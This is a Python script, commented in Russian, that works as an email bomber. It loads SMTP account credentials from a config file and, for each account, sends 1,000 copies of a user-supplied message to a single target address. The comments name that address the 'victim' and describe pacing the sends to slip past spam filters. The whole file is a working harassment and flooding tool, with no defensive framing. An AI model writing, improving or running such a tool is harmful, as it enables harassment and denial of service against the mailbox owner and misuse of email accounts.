import smtplib
import time
import threading
import sys

from configparser import ConfigParser
from threading import Thread
from colorama import init, Fore
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Заголовок, сообщение
MESSAGE = [ "", "" ]
    
THREADS = []

def startServer(infoSMTP, emailFrom, emailPassword, emailTo):
    # Подключаемся к SMTP-серверу, используя нашу учётную запись
    server = smtplib.SMTP(infoSMTP)
    server.starttls()
    server.login(emailFrom, emailPassword)

    # Насколько выяснил, большинство спам-фильтров дают ограничение в 1000 сообщений
    # с одного аккаунта - будем иметь ввиду
    msg = MIMEMultipart()
    for i in range(0, 1000):
        # Подготавливаем сообщение (содержимое - титульник и сам текст)
        msg["Subject"] = MESSAGE[0]
        msg.attach(MIMEText(MESSAGE[1], "plain"))
        
        # Отправляем сообщения
        try:
            server.sendmail(emailFrom, emailTo, msg.as_string())
        except:
            print(f"[{Fore.RED}!{Fore.WHITE}] SMTP error: unknown error!")
        
        # Опытным путём выяснил: стоит делать паузу в 2 секунды
        time.sleep(2)
    
    # Освобождаем ресурсы
    server.quit()
    
def loadSMTP(configPath, emailTo):
    parser = None
    
    # Открываем сам конфиг
    try:
        parser = ConfigParser()
        parser.read(configPath)
    except:
        print(f"[{Fore.RED}!{Fore.WHITE}] Parser error: file {configPath} not found/is broken!")
        return False
    
    # Итерация секций в файле, название - не так важно
    infoSMTP = ""
    emailFrom = ""
    emailPassword = ""
    for section in parser.sections():
        # Пробуем получить необходимую информацию из секции
        try:
            infoSMTP = parser.get(section, "SMTP")
            emailFrom = parser.get(section, "MAIL_FROM")
            emailPassword = parser.get(section, "MAIL_PASSWORD")
        except:
            print(f"[{Fore.RED}!{Fore.WHITE}] Parser error: incorrect details!")
            return False
        
        # Пробуем подготовить дополнительный поток под сервер
        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Current SMTP: {Fore.YELLOW}{infoSMTP}")
        try:
            THREADS.append(threading.Thread(target = startServer, 
                args = (infoSMTP, emailFrom, emailPassword, emailTo, )))
        except:
            print(f"[{Fore.RED}!{Fore.WHITE}] SMTP error: unknown error!")
            return False
            
    return True

def main(configPath = "SMTP.ini"):
    # Хак под Windows 10 & Windows 11 для корректной отрисовки цветов шрифтов
    init(autoreset = True)

    argsLen = len(sys.argv)
    
    # Путь до конфиг-файла
    if argsLen > 1:
        configPath = str(sys.argv[1])
        
    # Заголовок сообщения
    if argsLen > 2:
        MESSAGE[0] = str(sys.argv[2])
    else:
        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Enter a e-mail title: ")
        MESSAGE[0] = input()
    
    # Исходный текст сообщения
    if argsLen > 3:
        MESSAGE[1] = str(sys.argv[3])
    else:
        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Enter a e-mail message: ")
        MESSAGE[1] = input()
        
    # Жертва
    emailTo = ""
    if argsLen > 4:
        emailTo = str(sys.argv[4])
    else:
        # Здесь могла быть проверка на корректный E-mail, однако...
        # (https://davidcel.is/posts/stop-validating-email-addresses-with-regex/)
        print(f"[{Fore.YELLOW}#{Fore.WHITE}] Enter a target email: ")
        emailTo = input()
    
    print(f"[{Fore.YELLOW}#{Fore.WHITE}] Loading a SMTP servers...")
    if (loadSMTP(configPath, emailTo) == False):
        return
    
    # Включаемся в работу и синхронизируем потоки перед выходом
    if (len(THREADS) > 0):
        print(f"[{Fore.YELLOW}#{Fore.WHITE}] {Fore.GREEN}ATTACK STARTED!")
        for i in THREADS:
            i.start()
            i.join()
    else:
        print(f"[{Fore.YELLOW}#{Fore.WHITE}] {Fore.RED}WORKING SMTP SERVERS NOT FOUND!")

if __name__ == "__main__":
    main()